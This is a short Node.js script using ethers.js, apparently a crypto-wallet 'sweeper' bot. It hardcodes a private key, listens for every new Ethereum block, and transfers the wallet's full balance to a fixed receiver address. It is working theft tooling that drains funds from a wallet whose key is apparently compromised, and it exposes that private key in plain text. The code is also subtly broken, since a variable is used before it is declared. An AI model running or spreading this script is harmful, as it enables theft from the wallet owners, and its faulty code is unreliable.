const { ethers } = require('ethers')

const provider = new ethers.providers.JsonRpcProvider('https://api.infura.io/v1/jsonrpc/mainnet')





const addressReceiver = '0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3'

const privateKeys = ["ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258"]

const bot = async =>{



    provider.on('block', async () => {
        try {


            console.log('Listening to new block, waiting ;)');

            for (let i = 0; i < privateKeys.length; i++) {

                const _target = new ethers.Wallet(privateKeys[i]);
                const target = _target.connect(provider);
                const balance = await provider.getBalance(target.address);
                console.log(balance.toString())

                const gasPrice = await provider.getGasPrice();
                //estimate gas for transfer of all balance
                const gasLimit = await target.estimateGas({
                    to: addressReceiver,
                    value: amount
                });
                console.log(gasLimit);
                const gas1 = gasLimit.mul(5)
                const gas2 = gas1.div(3)
                const totalGasCost = gas2.mul(gasPrice);
                console.log(totalGasCost);
                if (balance.sub(totalGasCost) > 0) {
                    console.log("New Account with Eth!");
                    const amount = balance.sub(totalGasCost);

                    try {
                        await target.sendTransaction({
                            to: addressReceiver,
                            value: amount


                        });
                        console.log(`Success! transferred -->${ethers.utils.formatEther(amount)}`);
                    } catch (e) {
                        console.log(`error: ${e}`);
                    }
                }

            }
        }
        catch (err){
            console.log(err)
        }
    })
}

bot();